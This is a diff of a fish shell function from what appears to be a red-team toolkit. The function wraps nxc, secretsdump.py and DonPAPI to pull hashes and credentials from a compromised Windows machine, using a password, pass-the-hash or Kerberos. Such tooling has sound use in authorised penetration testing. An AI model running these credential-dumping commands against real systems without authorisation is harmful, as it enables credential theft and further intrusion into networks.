@@ -1,79 +1,101 @@
 function _ezpz_getloot
     source $EZPZ_HOME/functions/_ezpz_colors.fish
 
-    # Usage message
-    set usage "
-Usage: ezpz loot -t <target> -u <user> -d <domain> [-p <password> | -H <hash>] [-k] [-x <protocol>]
-  Extracts information and secrets from a compromised Windows machine.
+    set -l options 't/target=' 'u/username=' 'p/password=' 'H/hash=' 'd/domain=' 'k/kerberos' 'x/protocol=' 'h/help'
+    
+    if not argparse $options -- $argv
+        return 1
+    end
+    
+    set -l usage "
+getloot - Extract information and secrets from a compromised Windows machine
 
-  -t, --target    Target IP or hostname of the compromised Windows machine. (Required)
-  -u, --user      Username for authentication. (Required)
-  -d, --domain    Domain for authentication. (Required)
-  -p, --password  Password for authentication.
-  -H, --hash      NT hash for pass-the-hash authentication.
-  -k, --kerb      Use Kerberos authentication (requires a valid TGT).
-  -x, --protocol  Protocol to use for remote execution (smb or winrm).
-                  Default: winrm. If smb, PowerShell commands will be wrapped in 'powershell -c'.
+Usage: ezpz loot -t <target> -u <user> -d <domain> [options]
+
+Options:
+  -t, --target <ip>         Target IP or hostname (Required)
+  -u, --username <user>     Username for authentication (Required)
+  -d, --domain <domain>     Domain for authentication (Required)
+  -p, --password <pass>     Password for authentication
+  -H, --hash <hash>         NTLM hash for pass-the-hash
+  -k, --kerberos            Use Kerberos authentication
+  -x, --protocol <proto>    Protocol to use (smb/winrm, default: winrm)
+  -h, --help                Show this help message
+
+Examples:
+  ezpz loot -t 192.168.1.10 -u administrator -H hash -d corp.local
+  ezpz loot -t 192.168.1.20 -u domain\\user -p pass -d domain.local
+  ezpz loot -t 192.168.1.30 -u user -k -d domain.local
 "
-
-    # Variables
-    set target ""
-    set user ""
-    set domain ""
-    set password ""
-    set hash ""
-    set kerb 0
-    set protocol "winrm"
-
-    # Argument parsing
-    argparse 't/target=' 'u/user=' 'd/domain=' 'p/password=' 'H/hash=' 'k/kerb' 'x/protocol=' 'h/help' -- $argv
-    or return 1
-
+    
     if set -q _flag_help
         echo $usage
         return 1
     end
-
-    # Validate required arguments
+    
     if not set -q _flag_target
-        ezpz_error "Missing target parameter."
+        ezpz_error "Target IP required (-t)"
         echo $usage
         return 1
     end
-    if not set -q _flag_user
-        ezpz_error "Missing user parameter."
+    
+    if not set -q _flag_username
+        ezpz_error "Username required (-u)"
         echo $usage
         return 1
     end
+    
     if not set -q _flag_domain
-        ezpz_error "Missing domain parameter."
+        ezpz_error "Domain required (-d)"
         echo $usage
         return 1
     end
-
-    # Set variables
-    set target $_flag_target
-    set user $_flag_user
-    set domain $_flag_domain
-
-    if set -q _flag_password
-        set password $_flag_password
-    end
-    if set -q _flag_hash
-        set hash $_flag_hash
-    end
-    if set -q _flag_kerb
-        set kerb 1
-    end
+    
+    set -l target $_flag_target
+    set -l protocol winrm
+    
     if set -q _flag_protocol
         set protocol $_flag_protocol
     end
-
-    # Validate protocol
-    if test "$protocol" != "smb" -a "$protocol" != "winrm"
-        ezpz_error "Invalid protocol specified: $protocol. Must be 'smb' or 'winrm'."
+    
+    if not contains $protocol smb winrm
+        ezpz_error "Invalid protocol: $protocol. Use smb or winrm"
         echo $usage
         return 1
+    end
+    
+    set -l auth_args
+    
+    if set -q _flag_username
+        set -a auth_args -u $_flag_username
+    end
+    
+    if set -q _flag_password
+        set -a auth_args -p $_flag_password
+    else if set -q _flag_hash
+        set -a auth_args -H $_flag_hash
+    else if set -q _flag_kerberos
+        set -a auth_args -k
+        if set -q KRB5CCNAME
+            set -a auth_args --use-kcache
+            ezpz_cmd "Using KRB5CCNAME at $KRB5CCNAME"
+        end
+        # Time synchronization for Kerberos
+        if command -v ntpdate >/dev/null 2>&1
+            ezpz_info "Synchronizing clock with DC for Kerberos authentication..."
+            sudo ntpdate -u $target >/dev/null 2>&1
+        else
+            ezpz_warn "ntpdate not found. Skipping time sync. Kerberos may fail if clocks are skewed."
+        end
+    end
+
+    if set -q _flag_domain
+        set -a auth_args -d $_flag_domain
+    end
+    
+    set -l user $_flag_username
+    if string match -q "*\\*" $user
+        set user (string split '\\' $user)[2]
     end
 
     # Prerequisites check
@@ -101,7 +123,7 @@ Usage: ezpz loot -t <target> -u <user> -d <domain> [-p <password> | -H <hash>] [
     end
 
     # Time synchronization for Kerberos
-    if test $kerb -eq 1
+    if set -q _flag_kerberos
         if command -v ntpdate >/dev/null 2>&1
             ezpz_info "Synchronizing time with target for Kerberos authentication..."
             sudo ntpdate -u "$target" >/dev/null 2>&1
@@ -111,15 +133,7 @@ Usage: ezpz loot -t <target> -u <user> -d <domain> [-p <password> | -H <hash>] [
     end
 
     # Build authentication arguments for nxc
-    set nxc_args "$target" "-u" "$user" "-d" "$domain"
-    if test -n "$password"
-        set nxc_args $nxc_args "-p" "$password"
-    else if test -n "$hash"
-        set nxc_args $nxc_args "-H" "$hash"
-    end
-    if test $kerb -eq 1
-        set nxc_args $nxc_args "-k"
-    end
+    set -l nxc_args $target $auth_args
 
     # Determine PowerShell wrapper for SMB
     set pwsh_wrapper ""
@@ -191,26 +205,22 @@ Usage: ezpz loot -t <target> -u <user> -d <domain> [-p <password> | -H <hash>] [
     ezpz_info "Running secretsdump.py to extract hashes..."
 
     # Build secretsdump command arguments
-    set secretsdump_cmd_args
-    set target_auth_string ""
+    set -l secretsdump_cmd_args
+    set -l target_auth_string ""
 
     # Construct authentication string
-    if test -n "$user"
-        set target_auth_string "$user"
-        if test -n "$password"
-            set target_auth_string "$target_auth_string:$password"
-        end
-        set target_auth_string "$target_auth_string@$target"
-    else
-        set target_auth_string "@$target"
+    set target_auth_string "$_flag_username"
+    if set -q _flag_password
+        set target_auth_string "$target_auth_string:$_flag_password"
     end
+    set target_auth_string "$target_auth_string@$target"
 
     set secretsdump_cmd_args $target_auth_string
 
     # Add authentication flags
-    if test -n "$hash"
-        set secretsdump_cmd_args $secretsdump_cmd_args "-hashes" ":$hash"
-    else if test $kerb -eq 1
+    if set -q _flag_hash
+        set secretsdump_cmd_args $secretsdump_cmd_args "-hashes" ":$_flag_hash"
+    else if set -q _flag_kerberos
         set secretsdump_cmd_args $secretsdump_cmd_args "-k" "-no-pass"
     end
 
@@ -270,15 +280,15 @@ Usage: ezpz loot -t <target> -u <user> -d <domain> [-p <password> | -H <hash>] [
         set donpapi_auth_arg_string ""
         
         # Reconstruct the authentication argument for donpapi
-        if test -n "$password"
-            set donpapi_auth_arg_string "-p $password"
-        else if test -n "$hash"
-            set donpapi_auth_arg_string "-H $hash"
+        if set -q _flag_password
+            set donpapi_auth_arg_string "-p $_flag_password"
+        else if set -q _flag_hash
+            set donpapi_auth_arg_string "-H $_flag_hash"
         end
 
         if test -n "$donpapi_auth_arg_string"
             ezpz_cmd "Next Step: Try dumping DPAPI master keys and credentials with DonPAPI:"
-            ezpz_info "donpapi collect -t $target -u \"$user\" $donpapi_auth_arg_string --ntfile \"$all_parsed_hashes_file_root\""
+            ezpz_info "donpapi collect -t $target -u \"$_flag_username\" $donpapi_auth_arg_string --ntfile \"$all_parsed_hashes_file_root\""
         else
             ezpz_warn "DonPAPI suggestion skipped: No password or hash provided for authentication."
         end
